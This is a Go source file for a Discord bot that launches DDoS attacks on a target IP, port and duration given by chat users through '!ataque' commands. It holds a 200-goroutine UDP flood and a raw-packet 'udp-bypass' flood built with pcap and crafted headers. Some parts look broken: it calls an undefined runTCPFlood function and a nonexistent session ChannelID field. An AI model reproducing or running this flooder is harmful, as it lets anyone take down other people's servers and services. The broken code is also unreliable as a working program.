package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Constants
const (
	DefaultPacketSize = 1400
)

// readToken reads the Discord token from the environment.
func readToken() (string, error) {
	token := os.Getenv("DISCORD_TOKEN")
	if token == "" {
		return "", fmt.Errorf("DISCORD_TOKEN environment variable not set")
	}
	return token, nil
}

// flood sends UDP packets to the target.
func flood(target string, port int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	raddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", target, port))
	if err != nil {
		log.Println("Error resolving address:", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		log.Println("Error dialing UDP:", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)

	payload := make([]byte, DefaultPacketSize)
	rand.Read(payload)

	for time.Now().Before(endTime) {
		_, err := conn.Write(payload)
		if err != nil {
			log.Println("Error writing to UDP connection:", err)
			continue
		}
	}
}

// runFlood starts multiple goroutines to send UDP packets.
func runFlood(target string, port, duration int) {
	rand.Seed(time.Now().UnixNano())
	threads := 200
	var wg sync.WaitGroup
	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go flood(target, port, duration, &wg)
	}

	wg.Wait()
}

// udpBypass sends custom crafted UDP packets.
func udpBypass(target string, port int, duration int) {
	// Find all devices
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	// Iterate through devices until we find one that's up
	var handle *pcap.Handle
	for _, device := range devices {
		// Open device
		handle, err = pcap.OpenLive(device.Name, 1600, false, pcap.BlockForever)
		if err != nil {
			continue // try next device
		}

		// Found a working device
		log.Printf("Using device: %s\n", device.Name)
		break
	}

	// Check if handle is nil
	if handle == nil {
		log.Fatalf("Failed to find a usable device: %v\n", err)
	}
	defer handle.Close()

	// Create layers
	ethLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x01}, // Example MAC, needs to be valid for your network
		DstMAC:       net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x02}, // Example MAC, needs to be valid for your network
		EthernetType: layers.EthernetTypeIPv4,
	}
	ipLayer := &layers.IPv4{
		SrcIP:    net.ParseIP("192.168.1.100"), // Example IP, needs to be valid for your network
		DstIP:    net.ParseIP(target),          // Target IP
		Protocol: layers.IPProtocolUDP,
		Version:  4,
		IHL:      5,
		TTL:      64,
	}
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(rand.Intn(65535-1024) + 1024), // Ephemeral port
		DstPort: layers.UDPPort(port),                        // Target port
	}

	// Serialize UDP checksum for correct recalculation
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		log.Fatal("Error setting network layer for checksum:", err)
	}

	// Create a buffer and options for serialization
	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Serialize layers
	err = gopacket.SerializeLayers(buffer, options,
		ethLayer,
		ipLayer,
		udpLayer,
		gopacket.Payload(generateRandomPayload(DefaultPacketSize)),
	)
	if err != nil {
		log.Fatal("Error serializing layers:", err)
	}

	packetData := buffer.Bytes()

	startTime := time.Now()
	endTime := startTime.Add(time.Duration(duration) * time.Second)

	// Send packets until the end time
	for time.Now().Before(endTime) {
		err = handle.WritePacketData(packetData)
		if err != nil {
			log.Printf("Error sending packet: %v\n", err)
		}
		time.Sleep(time.Millisecond) // Adjust as needed
	}
}

// generateRandomPayload generates a random byte slice of a given size.
func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

// handleCommand processes Discord commands.
func handleCommand(s *discordgo.Session, command string) {
	args := strings.Fields(command)
	if len(args) >= 4 && args[1] == "udp-bypass" {
		if len(args) != 5 {
			s.ChannelMessageSend(s.ChannelID, "Usage: `!ataque udp-bypass ip port time`")
			return
		}

		ip := args[2]
		port, err1 := strconv.Atoi(args[3])
		duration, err2 := strconv.Atoi(args[4])

		if err1 != nil || err2 != nil {
			s.ChannelMessageSend(s.ChannelID, "Puerto o tiempo no válido")
			return
		}

		s.ChannelMessageSend(s.ChannelID, fmt.Sprintf("Successful Attack UDP-Bypass IP:%s:%d Time: %d ", ip, port, duration))

		go func() {
			udpBypass(ip, port, duration)
			s.ChannelMessageSend(s.ChannelID, fmt.Sprintf("Attack UDP-Bypass %s:%d", ip, port))
		}()
		return
	}

	if len(args) >= 4 && args[1] == "tcp" {
		ip := args[2]
		port, err1 := strconv.Atoi(args[3])
		duration, err2 := strconv.Atoi(args[4])
		if err1 != nil || err2 != nil {
			log.Println("Puerto o tiempo no válido")
			return
		}
		log.Printf("Successful Attack IP:%s:%d Time: %d ", ip, port, duration)
		go func() {
			runTCPFlood(ip, port, duration)
			log.Printf("Attack finish %s:%d finalizado.", ip, port)
		}()
		return
	}

	s.ChannelMessageSend(s.ChannelID, "Invalid command. Use `!ataque udp-bypass ip port time` or `!ataque tcp ip port time`")
}

func main() {
	token, err := readToken()
	if err != nil {
		log.Println("Error reading token:", err)
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Println("Error creating Discord session:", err)
		return
	}

	dg.AddHandler(func(s *discordgo.Session, m *discordgo.MessageCreate) {
		if m.Author.Bot {
			return
		}
		content := m.Content
		if strings.HasPrefix(content, "!ataque") {
			handleCommand(s, m.Content) // Pass the whole message content
		}
	})

	err = dg.Open()
	if err != nil {
		log.Println("Error opening connection:", err)
		return
	}

	fmt.Println("Bot is now running. Press CTRL-C to exit.")
	defer dg.Close()

	// Keep the bot running until a termination signal is received.
	select {}
}
